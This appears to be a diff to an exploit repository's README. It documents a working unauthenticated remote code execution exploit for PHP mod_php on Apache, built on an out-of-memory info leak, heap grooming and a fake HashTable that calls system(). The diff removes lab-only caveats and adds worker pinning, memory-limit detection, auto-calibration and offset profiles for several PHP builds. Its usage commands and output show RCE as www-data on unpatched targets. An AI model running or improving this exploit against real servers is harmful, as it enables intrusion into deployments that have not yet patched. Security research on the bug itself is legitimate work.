@@ -10,7 +10,14 @@ When PHP hits `memory_limit` during multipart request processing, `longjmp()` ab
 
 ### Full RCE PoC (`poc_rce.py`)
 
-A working, verified unauthenticated RCE exploit. Three stages, each a pair of HTTP requests to the same Apache worker:
+A working, verified unauthenticated RCE exploit that handles real-world Apache mod_php deployments:
+
+- **Worker pinning:** auto-detects Apache prefork worker count, pins N-1 workers with incomplete POST requests so all exploit traffic hits the same worker
+- **Memory limit detection:** probes the target's `memory_limit` from OOM error messages
+- **Auto-calibration:** discovers heap grooming parameters (STAGE1_N, forge_len, STAGE2_T) at runtime instead of hardcoding them
+- **Profile system:** lookup table of known `php:*-apache` Docker image offsets (zif_system, zval_ptr_dtor), plus ELF symbol extraction from containers via `--extract-offsets`
+
+Three stages, each a pair of HTTP requests to the same Apache worker:
 
 **Stage 1 -- Zend MM chunk base leak:** (same as info leak below)
 **Stage 2 -- libphp.so base leak:** (same as info leak below)
@@ -20,21 +27,38 @@ A working, verified unauthenticated RCE exploit. Three stages, each a pair of HT
 3. Result: Session cleanup calls pDestructor on the fake HT, executing `system(cmd)` as www-data
 
 ```bash
-# Full RCE (writes proof to /tmp/pwned inside the container)
-python3 poc_rce.py 8896 "id>/tmp/pwned"
+# Full auto (detects workers, memory_limit, calibrates heap params)
+python3 poc_rce.py -u http://TARGET:8896/index.php -c "id>/tmp/pwned" --container modphp-vuln
+
+# Explicit single-worker, skip calibration
+python3 poc_rce.py -u http://127.0.0.1:8896/index.php -c "id>/tmp/pwned" \
+  --container modphp-vuln --workers 1 --no-calibrate --memory-limit 8
+
+# Extract offsets from container's libphp.so
+python3 poc_rce.py -u http://127.0.0.1:8896/index.php -c "id>/tmp/pwned" \
+  --container modphp-vuln --extract-offsets
 
 # Output:
-#   [1/3] Leak Zend MM chunk base
-#     [+] chunk_base = 0x7f5375e00000
-#   [2/3] Leak libphp.so base
-#     [+] libphp_base = 0x7f53779df000
-#   [3/3] RCE
+#   [1/6] Fingerprint
+#     PHP version: 8.4.26
+#     Profile matched
+#   [2/6] Memory limit
+#     Detected: 8M
+#   [3/6] Worker pinning
+#     Detected 10 workers
+#     Pinned 9 workers
+#   [4/6] Auto-calibration
+#     stage1_n=841 forge_len=63
+#     stage2_t=406
+#   [5/6] Exploit chain (attempt 1/3)
+#     chunk_base = 0x7fdace000000
+#     libphp_base = 0x7fdacffcb000
+#     zif_system  = 0x7fdad0430370
 #     [+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-**Verified:** 3/3 runs on php:8.4.26-apache (amd64), single-worker prefork. First spray attempt each time.
-**Negative control:** PHP 8.4.27 triggers OOM but ZEND_HAS_OOM checks prevent disclosure. No RCE.
-**Heap calibration:** ~60% of container restarts produce a compatible heap state for the bookworm profile values. The exploit retries across restarts.
+**Verified:** RCE on php:8.4.26-apache (amd64) with 1, 5, and 10 workers. First spray attempt each time.
+**Negative control:** PHP 8.4.27 detected as patched; exploit refuses to proceed.
 **Max command length:** 14 bytes (limited by the 167-byte fake HashTable structure).
 
 ### Information disclosure PoC (`poc_info_leak.py`)
@@ -102,24 +126,30 @@ python3 trigger_oom.py --port 8896
 
 ## Lab requirements
 
-The info disclosure PoC requires:
-- `php:8.4.26-apache` (mod_php, Apache prefork)
-- Single-worker prefork (`MaxRequestWorkers 1`) for deterministic same-worker targeting
-- `memory_limit = 8M` (the OOM trigger is sized as `memory_limit + 12M`)
-- `post_max_size = 256M` (allow the large OOM body)
-- `display_errors = On`
-- `session.upload_progress.enabled = On`
-- `session.use_strict_mode = 0`
+The RCE PoC requires:
+- `php:8.4.26-apache` or any unpatched `php:*-apache` image (mod_php, Apache prefork)
+- `post_max_size` large enough for the OOM trigger (default 256M is fine)
+- `display_errors = On` (for memory_limit auto-detection; exploit works without it but needs `--memory-limit`)
+- `session.upload_progress.enabled = On` (PHP default)
+- `session.use_strict_mode = 0` (PHP default)
 
-These are laboratory conditions. The heap calibration values are specific to this exact libphp.so build.
+The exploit auto-detects worker count and memory_limit, and auto-calibrates heap grooming parameters at runtime. Single-worker mode is no longer required.
 
-## Heap calibration
+## Build profiles
 
-The exploit requires per-build calibration values that determine the exact grooming field counts, sub-array indices, and padding needed to place the fake HashTable at the right heap offset. The values in this repo are calibrated for `php:8.4.26-apache` (bookworm-amd64, libphp.so SHA256 51663cf8...).
+Symbol offsets (zif_system, zval_ptr_dtor) are build-specific constants. The exploit ships with profiles for:
 
-PHP's hash randomization (random seed per process start) changes the allocation order within the heap. Not every container restart produces a compatible heap state. With the bookworm profile values, approximately 60% of restarts work. The exploit handles this by retrying across container restarts.
+| Build | Architecture | Status |
+|-------|-------------|--------|
+| 8.4.26 | amd64 | Verified RCE |
+| 8.4.25 | aarch64 | Offsets verified |
+| 8.5.11 | amd64 | Offsets verified |
+| 8.5.11 | aarch64 | Offsets verified |
+| 8.5.10 | aarch64 | Offsets verified |
+| 8.5.0 | amd64 | Offset-only |
+| 8.3.0 | amd64 | Offset-only |
 
-Different PHP builds (different distro, different compile flags, different version) need different calibration values. The devploit/php2shell project maintains profiles for several builds.
+For unlisted builds, use `--extract-offsets --container NAME` to parse offsets from the container's libphp.so ELF symbol table.
 
 ## Profile values (php-8.4.26-bookworm-amd64)
 
